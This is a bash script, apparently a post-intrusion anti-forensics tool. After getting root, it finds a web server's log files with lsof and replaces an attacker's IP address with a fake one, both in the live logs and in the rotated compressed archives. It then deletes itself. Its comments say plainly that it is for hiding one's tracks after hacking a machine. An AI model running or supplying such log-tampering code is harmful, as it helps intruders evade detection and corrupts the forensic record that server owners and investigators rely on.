#!/usr/bin/env bash
### by t4z3v4r3d ###
[ "`id -u`" != "0" ]&& echo -e  "\033[1;31m $0 cant run as $USER Please Give me root perms!!!!! \033[0;0m" && exit 1
[ lsof ]|| echo "LSOF NOT FOUND ! exit 1;" || exit 1 
[ $# -lt 2 ] && echo "usage : $0 \"your ip \" \"Your fake ip \"" && exit 1 
ip=$1
replace=$2
os=$OSTYPE
case $os in
Linux*) number="\$9"
	zip_type=gz
;;
linux*) number="\$9"
	zip_type=gz
;;
FreeBSD*) number="\$8,\"/\",\$10"
	  zip_type=bz2
;;
*) number=*
;;
esac
comp_cln(){
for zp in  $(ls ${line[$i]}.[0-9].$zip_type) ;do gzip -cdk $zp | sed 's/'$ip'/'$replace'/g' | gzip >/tmp/$(basename $zp) && echo -e "[\xE2\x9C\x94]  /tmp/$(basename $zp) -> ${line[$i]}.$(basename $zp)" || echo -e "[\xE2\x9D\x8C]  /tmp/$(basename $zp) -> ${line[$i]}.$(basename $zp)" ;done 
}
echo "Searching for attacker IP: $ip target machine: $os ,number = $number, type =$zip_type"
 ### if listening port is default everything will be ok, else change it you hacked it not me .
web_srv="`lsof 2>/dev/null -iTCP -sTCP:LISTEN -PN |grep  '*:80\|*:443' 2> /dev/null |awk {' print $1 '}|uniq`" 
[ -z $web_srv ]&& echo -e  "\033[1;31m Running Web server not found \033[0m" && exit 
 ### looking for log files with lsof, I love array...
line=($(lsof 2>/dev/null| grep $web_srv | grep log  | awk {' print '$number' '} | sort | uniq | sed 's/ //g'))
for ((i=0;i<${#line[*]};i++ ));do 
 ### ip edit in file.
[ "`grep -m 1  $ip ${line[$i]}`" ]&& sed -ie 's/'$ip'/'$replace'/g' ${line[$i]} 
echo "Searching for old files ${line[$i]}.*.$zip_type"
[  "`ls ${line[$i]}* | grep $zip_type `" ]&& comp_cln
done
rm $0
